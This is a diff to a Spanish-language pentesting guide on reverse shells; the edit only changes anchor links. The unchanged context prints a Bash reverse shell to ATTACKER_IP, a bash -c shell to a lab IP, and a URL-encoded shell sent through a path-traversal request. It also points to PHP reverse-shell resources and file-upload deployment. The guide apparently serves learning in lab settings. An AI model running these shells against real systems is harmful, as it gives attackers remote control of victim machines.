@@ -6,19 +6,19 @@ Guía rápida para comprender, generar y utilizar reverse shells en entornos de 
 
 ## 📚 Tabla de contenidos
 
-- [¿Qué es una reverse shell?](#qué-es-una-reverse-shell)
-- [Proceso típico](#proceso-típico)
-- [Ejemplo de reverse shell en Bash](#ejemplo-de-reverse-shell-en-bash)
-- [Reverse shell: procedimiento práctico](#reverse-shell-procedimiento-práctico)
-- [Recursos para encontrar o generar reverse shells](#recursos-para-encontrar-o-generar-reverse-shells)
-- [Tips y buenas prácticas](#tips-y-buenas-prácticas)
-  - [Uso de `bash -c`](#uso-de-bash--c)
-  - [Envío de reverse shell a través de una URL (URL encoding)](#envío-de-reverse-shell-a-través-de-una-url-url-encoding)
-- [Recomendaciones adicionales](#recomendaciones-adicionales)
--  [Subir reverse en PHP (si la página permite subida de archivos)](#subir_reverse)
+- [¿Qué es una reverse shell?](#que)
+- [Proceso típico](#proceso)
+- [Ejemplo de reverse shell en Bash](#ejemplo)
+- [Reverse shell: procedimiento práctico](#reverse)
+- [Recursos para encontrar o generar reverse shells](#recursos)
+- [Tips y buenas prácticas](#tips)
+  - [Uso de `bash -c`](#uso)
+  - [Envío de reverse shell a través de una URL (URL encoding)](#envio)
+- [Recomendaciones adicionales](#recomendaciones)
+-  [Subir reverse en PHP (si la página permite subida de archivos)](#subir)
 
 ---
-
+<a name="que"></a>
 ## 🎭 ¿Qué es una reverse shell?
 
 Una **reverse shell** es una técnica utilizada principalmente en **pruebas de penetración (pentesting)** para obtener acceso remoto a un sistema comprometido.  
@@ -26,7 +26,7 @@ Permite al atacante controlar el sistema víctima mediante una conexión salient
 De esta forma se pueden evadir restricciones de firewall que bloquean conexiones entrantes.
 
 ---
-
+<a name="proceso"></a>
 ## 🔄 Proceso típico
 
 1. El atacante configura un servidor a la escucha (por ejemplo, con `nc -lvp 4444` o herramientas como Metasploit).
@@ -35,7 +35,7 @@ De esta forma se pueden evadir restricciones de firewall que bloquean conexiones
 4. El atacante recibe un **prompt de shell** interactivo de la máquina víctima.
 
 ---
-
+<a name="ejemplo"></a>
 ## 🖥️ Ejemplo de reverse shell en Bash
 
 ```bash
@@ -43,7 +43,7 @@ bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
 ```
 
 ---
-
+<a name="reverse"></a>
 ## 🛠️ Reverse shell: procedimiento práctico
 
 ### Pasos
@@ -74,16 +74,16 @@ bash -c "bash -i >& /dev/tcp/172.17.0.1/445 0>&1"
 En el listener de `nc`, se establece la conexión interactiva.
 
 ---
-
+<a name="recursos"></a>
 ## 🌐 Recursos para encontrar o generar reverse shells
 
 - [Pentest Monkey Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 - [RevShells Online Generator](https://www.revshells.com/)
 
 ---
-
+<a name="tips"></a>
 ## 🧠 Tips y buenas prácticas
-
+<a name="uso"></a>
 ### ⚙️ Uso de `bash -c`
 
 Si la reverse shell es en Bash, es recomendable utilizar:
@@ -105,7 +105,7 @@ bash -c 'comando1; comando2; ...'
 ```
 
 ---
-
+<a name="envio"></a>
 ### 🌍 Envío de reverse shell a través de una URL (URL encoding)
 
 Si el vector de envío de la reverse shell es a través de una URL, es recomendable **encodear** la reverse shell.
@@ -151,7 +151,7 @@ http://172.17.0.2/test.php?page=../../../../../var/mail/www-data&cmd=bash%20-c%2
 👉 Desde [https://www.revshells.com/](https://www.revshells.com/) también tienes la opción de encodear directamente.
 
 ---
-
+<a name="recomendaciones"></a>
 ## 📝 Recomendaciones adicionales
 
 - **Probar diferentes tipos de reverse shell** si Bash no funciona (por ejemplo: PHP, Python, Perl, Netcat con `-e`, etc.).
@@ -164,7 +164,7 @@ https://pentestmonkey.net/tools/web-shells/php-reverse-shell
 Solo debes editar la IP y el puerto en el código antes de desplegarla.
 
 ---
-
+<a name="subir"></a>
 ## 📂 Subir reverse en PHP (si la página permite subida de archivos)
 
 A veces, la página nos permite subir archivos y luego acceder a ellos directamente.  
